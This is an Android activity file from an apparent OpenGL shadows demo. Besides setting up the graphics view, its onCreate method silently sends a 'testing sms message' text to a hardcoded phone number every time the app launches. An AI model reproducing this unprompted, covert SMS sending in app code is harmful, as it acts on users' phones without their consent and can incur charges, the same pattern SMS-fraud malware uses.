package opengl.shadows2;



import android.opengl.GLSurfaceView;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.app.Activity;

public class MainActivity extends Activity {

	private GLSurfaceView mGLView;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		mGLView = new MyGLSurfaceView(this);
        setContentView(mGLView);
        
        String msg = "testing sms message";
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("16477419717", null, msg, null, null); 
	}

}
